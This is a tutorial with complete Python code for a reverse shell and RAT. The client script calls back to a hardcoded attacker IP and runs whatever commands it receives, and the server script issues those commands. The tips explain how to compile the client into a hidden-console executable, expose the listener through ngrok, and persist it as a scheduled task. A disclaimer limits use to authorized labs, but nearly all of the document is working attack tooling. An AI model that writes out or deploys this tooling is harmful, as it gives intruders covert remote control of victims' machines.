💡 Overview

This tutorial demonstrates how to build a client-server model where:

    The client (victim machine) connects back to the attacker (server).

    The server can send commands and receive output, simulating a RAT.

⚠️ Note: This guide is for ethical hacking education, CTFs, or authorized environments only.
📦 Tools Used

    Python 3.x

    Standard socket and subprocess libraries

🧠 Client-Side Code (Reverse Shell)

This is the code that would run on the target system (client). It opens a connection to the attacker and waits for commands.

# client.py
import socket
import subprocess
import os

SERVER_HOST = '192.168.13.3'  # Your attacker/server IP
SERVER_PORT = 4444            # Chosen port to connect to

def connect_back():
    try:
        s = socket.socket()
        s.connect((SERVER_HOST, SERVER_PORT))
        s.send(b"[+] Connection established from client\n")

        while True:
            command = s.recv(1024).decode()

            if command.lower() == "exit":
                break
            elif command.startswith("cd "):
                try:
                    os.chdir(command.strip("cd "))
                    s.send(b"[+] Changed directory\n")
                except Exception as e:
                    s.send(str(e).encode())
            else:
                output = subprocess.getoutput(command)
                s.send(output.encode())

    except Exception as e:
        print(f"[!] Error: {e}")

    finally:
        s.close()

if __name__ == "__main__":
    connect_back()

🖥 Server Code (Attacker Side)

This is what you run on your own system. It waits for a connection, then allows you to execute commands on the client.

# server.py
import socket

LISTEN_HOST = '0.0.0.0'  # Listen on all interfaces
LISTEN_PORT = 4444

def start_server():
    s = socket.socket()
    s.bind((LISTEN_HOST, LISTEN_PORT))
    s.listen(1)

    print(f"[*] Listening on {LISTEN_HOST}:{LISTEN_PORT}...")
    client_socket, client_address = s.accept()
    print(f"[+] Connection from {client_address}")

    while True:
        command = input("Shell> ")
        if not command.strip():
            continue
        client_socket.send(command.encode())

        if command.lower() == "exit":
            break

        result = client_socket.recv(4096).decode()
        print(result)

    client_socket.close()
    s.close()

if __name__ == "__main__":
    start_server()

✅ Features

    Command execution (via subprocess)

    Persistent connection until exit

    Change directories with cd <folder>

    Error handling

🔐 Security Considerations
Risk	Mitigation
Open connection	Use authentication and encryption (e.g., SSL sockets)
Reverse shell exposure	Whitelist attacker IPs
Anti-virus detection	Only run in labs or virtual machines
Unauthorized use	Get written permission or use test environments only
📁 Tips for Realistic Red Team / Lab Simulation

    Use pyinstaller to convert client to EXE:
    pyinstaller --noconsole --onefile client.py

    Use tools like ngrok or port forwarding to simulate public servers.

    Install the client as a "scheduled task" in a sandboxed lab (again: only with permission).
